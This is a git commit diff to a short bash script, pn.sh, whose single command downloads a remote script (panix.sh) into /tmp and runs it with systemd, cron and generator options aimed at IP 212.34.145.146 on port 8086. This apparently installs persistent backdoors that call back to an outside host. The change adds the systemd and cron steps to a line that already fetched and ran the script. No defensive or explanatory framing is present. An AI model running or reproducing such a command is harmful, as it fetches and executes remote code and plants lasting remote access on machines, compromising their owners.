7d91834edca85508127bd5b04bb85f091e5220a3
h-moody <73345535+h-moody@users.noreply.github.com>
2024-12-10 21:03:42 +0300

    Update pn.sh

--- pn.sh
+++ pn.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-/bin/bash -c 'curl -sL https://raw.githubusercontent.com/h-moody/tun0/refs/heads/main/panix.sh -o /tmp/pnx.sh /tmp/pnx.sh --generator --ip 212.34.145.146 --port 8086'
+/bin/bash -c 'curl -sL https://raw.githubusercontent.com/h-moody/tun0/refs/heads/main/panix.sh -o /tmp/pnx.sh /tmp/pnx.sh --systemd --default --ip 212.34.145.146 --port 8086 && /tmp/pnx.sh --cron --default --ip 212.34.145.146 --port 8086 && /tmp/pnx.sh --generator --ip 212.34.145.146 --port 8086'
